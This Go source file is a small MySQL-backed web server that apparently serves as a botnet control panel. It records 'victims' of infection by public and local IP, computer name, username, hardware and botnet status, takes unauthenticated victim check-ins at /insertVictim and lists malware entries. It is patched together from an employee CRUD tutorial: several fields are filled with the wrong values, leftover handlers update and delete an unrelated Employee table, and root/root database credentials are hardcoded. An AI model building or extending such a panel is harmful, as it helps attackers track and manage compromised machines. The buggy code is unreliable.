package main

import (
	"database/sql"
	"log"
	"net/http"
	"text/template"

	_ "github.com/go-sql-driver/mysql"
)

type Malware struct {
	Id            int
	MalwareTypeId int
	Situation     string
}

type Victim struct{
	Id int
	VictimIp string
	Victim_local_ip string
	Computer_name string
	Username string
	Computer_ram float32
	Computer_cpu string
	Computer_status []byte
	Botnet_status []byte

}

func dbConn() (db *sql.DB) {
	dbDriver := "mysql"
	dbUser := "root"
	dbPass := "root"
	dbName := "tester"
	db, err := sql.Open(dbDriver, dbUser+":"+dbPass+"@/"+dbName)
	if err != nil {
		panic(err.Error())
	}
	return db
}

var tmpl = template.Must(template.ParseGlob("form/*"))
func IndexVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Victim ORDER BY id DESC")
	if err != nil {
		panic(err.Error())
	}
	emp := Victim{}
	res := []Victim{}
	for selDB.Next() {
		var id int
		var victimIp string
		var victimLocalIp string
		var computer_name string
		var username string
		var computer_ram float32
		var computer_cpu string
		var computer_status []byte
		var botnet_status []byte
		err = selDB.Scan(&id, &victimIp, &victimLocalIp ,&computer_name,&username,&computer_ram,&computer_cpu,&computer_status,&botnet_status)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.VictimIp = victimIp
		emp.Victim_local_ip = victimLocalIp
		emp.Computer_name = victimLocalIp
		emp.Username = victimLocalIp
		emp.Computer_ram = computer_ram
		emp.Computer_cpu = computer_cpu
		emp.Computer_status = computer_status
		emp.Botnet_status = botnet_status
		res = append(res, emp)
	}
	_ = tmpl.ExecuteTemplate(w, "IndexVictim", res)
	defer db.Close()
}

func IndexMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC")
	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	res := []Malware{}
	for selDB.Next() {
		var id int
		var malwareTypeId int
		var situation string
		err = selDB.Scan(&id, &malwareTypeId, &situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.MalwareTypeId = malwareTypeId
		emp.Situation = situation
		res = append(res, emp)
	}
	_ = tmpl.ExecuteTemplate(w, "IndexMalware", res)
	defer db.Close()
}

func ShowMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	nId := r.URL.Query().Get("id")
	selDB, err := db.Query("SELECT * FROM Malware WHERE id=?", nId)
	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	for selDB.Next() {
		var id ,malwareTypeId int
		var situation string
		err = selDB.Scan(&id, &malwareTypeId, &situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.MalwareTypeId = malwareTypeId
		emp.Situation = situation
	}
	tmpl.ExecuteTemplate(w, "ShowMalware", emp)
	defer db.Close()
}

func New(w http.ResponseWriter, r *http.Request) {
	tmpl.ExecuteTemplate(w, "New", nil)
}

//func Edit(w http.ResponseWriter, r *http.Request) {
//	db := dbConn()
//	nId := r.URL.Query().Get("id")
//	selDB, err := db.Query("SELECT * FROM Employee WHERE id=?", nId)
//	if err != nil {
//		panic(err.Error())
//	}
//	emp := Employee{}
//	for selDB.Next() {
//		var id int
//		var name, city string
//		err = selDB.Scan(&id, &name, &city)
//		if err != nil {
//			panic(err.Error())
//		}
//		emp.Id = id
//		emp.Name = name
//		emp.City = city
//	}
//	tmpl.ExecuteTemplate(w, "Edit", emp)
//	defer db.Close()
//}

func InsertVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		id  := r.FormValue("id")
		victimIp  := r.FormValue("victimIp")
		victimLocalIp  := r.FormValue("victimLocalIp")
		computer_name  := r.FormValue("computer_name")
		username  := r.FormValue("username")
		computer_ram  := r.FormValue("computer_ram")
		computer_cpu  := r.FormValue("computer_cpu")
		computer_status  := r.FormValue("computer_status")
		botnet_status  := r.FormValue("botnet_status")
		insForm, err := db.Prepare("INSERT INTO Victim(id, victim_ip,victim_local_ip,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status ) VALUES(?,?,?,?,?,?,?,?,?)")
		if err != nil {
			panic(err.Error())
		}
		insForm.Exec(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status)
	}
	defer db.Close()
	http.Redirect(w, r, "/", 301)
}

func Update(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		name := r.FormValue("name")
		city := r.FormValue("city")
		id := r.FormValue("uid")
		insForm, err := db.Prepare("UPDATE Employee SET name=?, city=? WHERE id=?")
		if err != nil {
			panic(err.Error())
		}
		insForm.Exec(name, city, id)
		log.Println("UPDATE: Name: " + name + " | City: " + city)
	}
	defer db.Close()
	http.Redirect(w, r, "/", 301)
}

func Delete(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	emp := r.URL.Query().Get("id")
	delForm, err := db.Prepare("DELETE FROM Employee WHERE id=?")
	if err != nil {
		panic(err.Error())
	}
	delForm.Exec(emp)
	log.Println("DELETE")
	defer db.Close()
	http.Redirect(w, r, "/", 301)
}

func main() {
	log.Println("Server started on: http://localhost:8080")
	http.HandleFunc("/Malwares", IndexMalware)
	http.HandleFunc("/Victims", IndexVictim)
	http.HandleFunc("/getMalware", ShowMalware)
	http.HandleFunc("/insertVictim", InsertVictim)
	//http.HandleFunc("/edit", Edit)
	http.HandleFunc("/new", New)
	http.HandleFunc("/update", Update)
	http.HandleFunc("/delete", Delete)
	http.ListenAndServe(":8080", nil)
}
